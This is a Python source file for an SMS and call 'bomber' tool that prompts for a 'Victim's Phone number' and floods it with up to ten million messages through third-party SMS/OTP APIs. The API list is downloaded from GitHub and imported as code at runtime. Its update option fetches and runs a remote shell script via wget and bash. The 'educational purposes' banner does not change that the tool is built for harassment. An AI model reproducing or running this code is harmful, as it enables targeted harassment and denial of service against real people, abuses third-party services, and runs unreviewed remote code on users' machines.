# -*- coding: UTF-8 -*-
#
#
#  Copyright 2021 TDynamos <tdynamos@linux>
#
#  This program is free software; you can redistribute it and/or modify
#  it under the terms of the GNU General Public License as published by
#  the Free Software Foundation; either version 2 of the License, or
#  (at your option) any later version.
#
#  This program is distributed in the hope that it will be useful,
#  but WITHOUT ANY WARRANTY; without even the implied warranty of
#  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#  GNU General Public License for more details.
#
#  You should have received a copy of the GNU General Public License
#  along with this program; if not, write to the Free Software
#  Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston,
#  MA 02110-1301, USA.

################################## HEADER SCRIPT 1.0 ###################################
import os 
import sys
from itertools import cycle
from shutil import get_terminal_size
from threading import Thread
from time import sleep
import time
exit_status = 1
store_true = ""
col = {"BL" : '\033[30m',"B" : '\033[94m',"C" : '\033[96m',"D" : '\033[36m',"G" : '\033[92m',"P" : '\033[95m',"R" : '\033[91m',"Y": '\033[93m',"W" : '\033[37m',"BLACK_BG" : '\033[40m',"RED_BG" : '\033[41m',"GREEN_BG" : '\033[42m',"YELLOW_BG" : '\033[43m',"BLUE_BG" : '\033[44m',"PURPLE_BG" : '\033[45m',"CYAN_BG" : '\033[46m',"WHITE_BG" : '\033[47m',"BOLD" : '\033[1m',"FAINT" : '\033[2m',"ITALIC" : '\033[3m',"UNDERLINE" : '\033[4m',"BLINK" : '\033[5m',"INVERSE" : '\033[7m',"HIDDEN": '\033[8m',"STRIKE" : '\033[9m',"END" : '\033[0m'}

class Loader:
    def __init__(self, desc="Loading...", end="Done!", timeout=0.1):

        self.desc = desc
        self.end = end
        self.timeout = timeout

        self._thread = Thread(target=self._animate)
        self.steps = ["⢿ ", "⣻ ", "⣽ ", "⣾ ", "⣷ ", "⣯ ", "⣟ ", "⡿ "]
        self.done = False

    def start(self):
        self._thread.start()
        return self

    def _animate(self):
        for c in cycle(self.steps):
            if self.done:
                break
            print(f"\r{col['W']+c} {self.desc} ", flush=True, end="")
            sleep(self.timeout)

    def enter(self):
        self.start()

    def stop(self):
        self.done = True
        cols = get_terminal_size((80, 20)).columns
        print("\r" + f"" * cols, end="", flush=True)
        print(f"\r{self.end}", flush=True)

    def exit(self, exc_type, exc_value, tb):
        self.stop()

def checkImport(module):
    try:
        exec(f"import {module}")
    except Exception:
        return False
    return True 


def chekPacakage(pacakage):
    from shutil import which 
    if which(pacakage) is None:
        return False
    else:
        return True

def getArgs(test_args,type=""):
    args = sys.argv
    if type == str or type==None:
        if test_args in args:
            try:
                arg = (args[args.index(test_args)+1])
                return arg
            except IndexError:
                return "" 
        else:
            return None
    
    elif type == int:
        if test_args in args:
            try:
                arg = int(args[args.index(test_args)+1])
                return arg
            except ValueError:
                raise ValueError(f"'{test_args}' is not an integer ") from None 
            except IndexError:
                return "" 
        else:
            return None
    elif type == store_true:
        if test_args in args:
            return True 
        else:
            return False

def printBox(string,col1,col2):
    a = len(string)
    return (f'{col1}╔═{(a+1)*"═"}═╗\n║ {col2+string} {col1} ║\n╚═{(a+1)*"═"}═╝')

def error(string,exit=True):
    if exit is None or exit is False:
        print(f"{col['R']}[{col['Y']}Error{col['R']}] {col['R']}{string}")
        return None
    else:
        print(f"{col['R']}[{col['Y']}Error{col['R']}] {col['R']}{string}")
        sys.exit(exit_status)

def success(string):
    print(f"{col['R']}[{col['G']}  ✓  {col['R']}] {col['G']}{string}")

def message(string):
    print(f"{col['R']}[{col['B']}  >  {col['R']}] {col['Y']}{string}")

def ask(string):
    string = input(f"{col['R']}[{col['Y']}  ?  {col['R']}] {col['C']}{string} : {col['G']}")
    return string

def successR(string):
    return f"{col['R']}[{col['G']}  ✓  {col['R']}] {col['G']}{string}"

def messageR(string):
    f"{col['R']}[{col['B']}  >  {col['R']}] {col['Y']}{string}"

def aPrint(string,time_test):
    for i in string :
        sys.stdout.write(i)
        sys.stdout.flush()
        time.sleep(time_test)
    print()
if __name__ == "main":
    sys.exit("You can't run script directly")
else:
    pass

##################################### CODED BY ANSH DADWAL ##################################⏎  

for i in ['colorama','requests','tload']:
    if checkImport(i) is False:
        os.system("pip3 install "+i)
    else:
        pass

import os
import shutil
import sys
import subprocess
import string
import random
import json
import re
import time
import argparse
import zipfile
import requests

version = '4.0'

from colorama import Fore,Style
from colorama import init

init(autoreset=False)
print(Style.BRIGHT)

R = Style.BRIGHT+Fore.RED
B = Style.BRIGHT+Fore.BLUE
G = Style.BRIGHT+Fore.GREEN
C = Style.BRIGHT+Fore.CYAN
Y = Style.BRIGHT+Fore.YELLOW
M = Style.BRIGHT+Fore.MAGENTA
W='\033[0m'

def check_intr():
    try:
        requests.get("https://motherfuckingwebsite.com",timeout=1)
    except Exception:
        print("Abe Chutiya Internet On Kar. Internet Error")
        sys.exit(2)       

lic = """
#  Copyright 2021 TDynamos <tdynamos@linux>
#
#  This program is free software; you can redistribute it and/or modify
#  it under the terms of the GNU General Public License as published by
#  the Free Software Foundation; either version 2 of the License, or
#  (at your option) any later version.
#
#  This program is distributed in the hope that it will be useful,
#  but WITHOUT ANY WARRANTY; without even the implied warranty of
#  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#  GNU General Public License for more details.
#
#  You should have received a copy of the GNU General Public License
#  along with this program; if not, write to the Free Software
#  Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston,
#  MA 02110-1301, USA.
# if You Have Any Problem Contact Me On Insta 
# Api by Tbomb
"""
text = ''
logo = f"""{Style.BRIGHT+text}
{G}                      .~#########%%;~.
{G}                     /############%%;`\
{G}                    /######/~\/~\%%;,;,\
{G}                   |#######\    /;;;;.,.|
{G}                   |#########\/%;;;;;.,.|
{G}          XX       |##/~~\####%;;;/~~\;,|       XX
{G}        XX..X      |#|  o  \##%;/  o  |.|      X..XX
{G}      XX.....X     |##\____/##%;\____/.,|     X.....XX
{G} XXXXX.....XX      \#########/\;;;;;;,, /      XX.....XXXXX
{R}X |......XX%,.@      \######/%;\;;;;, /      @#%,XX......| X
{R}X |.....X  @#%,.@     |######%%;;;;,.|     @#%,.@  X.....| X'
{R}echo -e '\e[92mX  \...X     @#%,.@   ----------------    @ @ 00 0 xxxxxxxxx
{R} X# \.X       @#%,.@  Sms-Attack  @#%,.@        
{R}                @#%,.@              @#%,.@          
{R}                  @#%,.@          @#%,.@            
{B}                    @#%,.@      @#%,.@             
{B}                       @#%.,@  @#%,.@              
{B}                        NIKHIL KUMAR
{B}               INSTAGRAM:- NIKHIL4494KUMAR
               
╱╱╱╱╱╱╱╱╱╱ {C}Coder  : {Y}Nikhil kumar ╱╱╱╱╱╱╱╱╱╱
╱╱╱╱╱╱╱╱╱╱ {C}Version : {G}{version}   ╱╱╱╱╱╱╱╱╱╱
 """


def prepend_line(file_name, line):
    dummy_file = file_name + '.bak'
    with open(file_name, 'r') as read_obj, open(dummy_file, 'w') as write_obj:
        write_obj.write(line + '\n')
        for line in read_obj:
            write_obj.write(line)
    os.remove(file_name)
    os.rename(dummy_file, file_name)


def getApi(target):
    apiUrl = "https://raw.githubusercontent.com/T-Dynamos/BaapG-Attack/main/apiData.baap"
    try:
        a = requests.get(apiUrl)
        open('dataBa.py', 'wb').write(a.content)
        prepend_line('dataBa.py',f'target = {target}')
        import dataBa
        from dataBa import apis, apidata
    except Exception as e:
        return exit(str(e))
    return {"apis":apis,"apidata":apidata,"total":len(apis)}

                
def bomb(times1,target):
    finalApi = getApi(target)
    apis = finalApi["apis"]
    apidata = finalApi["apidata"]
    total = finalApi["total"]
    times = round(times1/total)
    if times == 0:
        times = 1
    print (printBox("Total apis : "+str(total)+" | Number of times to send : "+str(times1),col1=Style.BRIGHT+B,col2=Y))   
    print()
    success =0
    fail =0
    for i in range(0,times):
        for api in apis:
            if "POST" in api:
                url,data,head,method,check = api
                try:
                    a = requests.post(url,data=data,headers=head)
                    if check in a.text:
                        success += 1
                    else:
                        
                        fail += 1
                except Exception:
                    pass
                    fail += 1
                print(G+"\r"+"Success : "+str(success)+R+" Error : "+str(fail),end="")
            elif "GET" in api:
                url,head,method,check = api
                try:
                    a = requests.get(url,headers=head)
                    if check in a.text:
                        success += 1
                    else:
                        
                        fail += 1
                except Exception:
                    pass
                    fail += 1
                print("\r"+"Success : "+str(success)+R+" Error : "+str(fail),end="")
            else:
                print ("Unexpectedly Error")
                return exit()
            
        continue
    return success,fail


def sms():
	os.system('clear')
	print(Style.BRIGHT+logo)
	print()
	print(f"{R} | WARNING |  {Y}\n\n * This tool is very dangerous don't try it on your self\n ")
	print()
	target = input(
	    f"{G}[{W}+{G}] Enter the Victim's Phone number \n\n{W}-----{R}# {C}")	
	print()
	a = requests.get('https://raw.githubusercontent.com/T-Dynamos/BaapG-Attack/main/.protected.numbers').text
	if target in a :
		error(f"{R} You Can't Bomb This Number");print();res()
	else:
		bomb(10000000,target)	
	print(f"\n{B} Press {G}Ctrl { R}+ {G} C {B} to exit\n")


	res()

def wpbomb():
    if os.path.exists("/usr/bin/bash"):
        return message("WhatsApp bomber will be addedd soon ");print();res()
    target = input(
        f"{G}[{W}+{G}] Enter the Victim's Phone number \n\n{W}-----{R}# {C}") 

def ver_check():
	a = (G + '[+]' + C + ' Checking for Updates.....')
	ver_url = 'https://raw.githubusercontent.com/T-Dynamos/BaapG-Attack/main/.version'
	try:
		ver_rqst = requests.get(ver_url)
		ver_sc = ver_rqst.status_code
		if ver_sc == 200:
			github_ver = ver_rqst.text
			github_ver = github_ver.strip()
			if version == github_ver:
				pass
			else:
				print(a+C + '[' + G + ' Available : {} '.format(github_ver) + C + ']' + '\n')
		else:
			print(a+C + '[' + R + ' Status : {} '.format(ver_sc) + C + ']' + '\n')
	except Exception as e:
		print('\n' + R + '[-]' + C + ' Exception : ' + W + str(e))

def banner():
	print(logo)


def clr():
	os.system('clear')

def main(a):
    os.system('clear')
    ver_check() if a is False else os.system("")
    print(logo)
    print(Y)
    os.system(f'dat=$(date) && echo {Y}  ✯ {W}STARTED ON : {C}$dat')
    print(printBox(f"⚡ This tool is only for Educational Purposes !",col1=G,col2=Y))

    print(f"\n{G}Choose Any Option\n")
    text = (f"""{G}[{W}${G}]{R} FOLLOW I.G NIKHIL4494KUMAR 😁 {W}>>>{G}\n[{W}1{G}]{Y} SMS ATTACK {W}>>>\n{G}[{W}2{G}]{Y} CALL ATTACK {W}>>>\n{G}[{W}3{G}]{Y} MAIL BOMBER\n{W}{G}[{W}4{G}]{Y} WHATSAPP BOMBER{W} >>>\n{G}[{W}5{G}]{Y} ABOUT {W}>>>\n{G}[{W}6{G}]{Y} EXIT {W}>>>\n{G}[{W}>{G}]{Y} UPDATE {W}>>>\n""")
    print(text)
    a = input(f"{R} >>> {G}")
    if a == '$':
    	sms()
    elif a == '1':
    	clr()
    	banner()
    	selectnode(mode='sms')
    	res()
    elif a == '2':
        clr()
        banner()        
        selectnode(mode='call')
        res()
    elif a == '3':
        clr()
        banner()       
        selectnode(mode='mail')
        res()
    elif a == '4':
        clr()
        banner()        
        wpbomb()		
        res()	
    elif a == '5':
    	print(f"{C}\n All Credit : Nikhil kumar \n {G}Coded by Nikhil Kumar\n\n{W}{lic}\n\n")
    	res()
    elif a == '6':
    	exit()
    elif a == '>':
    	print()
    	print(f'{G} Starting Update')
    	print()
    	ver_check()
    	check_intr()
    	os.system("wget https://raw.githubusercontent.com/T-Dynamos/BaapG-Attack/main/.updatefile && bash .updatefile")
    	print(f"{G} Restart it")
    	exit()
    else:
    	return main(True)

def res():
	r=input(f"{Y}Do you want to restart [y/n] = ")
	if r =='y':
		main(False)
	else:
		print()
		aPrint(f"Follow on Ig : {W}@nikhil4494kumar",time_test=0.20)
		exit()



def selectnode(mode=""):
    if mode == "mail":
        return message("Mail bomber will be addedd soon ");print();res()
    target = input(
        f"{G}[{W}+{G}] Enter the Victim's Phone number \n\n{W}-----{R}# {C}") 
    print()
    times = input(f"{G}[{W}+{G}] Enter the no. of {mode} to send \n\n{W}-----{R}# {C}")  
    print()
    a = requests.get('https://raw.githubusercontent.com/T-Dynamos/BaapG-Attack/main/.protected.numbers').text
    if target in a :
        error(f"{R} You Can't Bomb This Number");print();res()
    else:
        bomb(int(times),target) 
        print()


main(False)
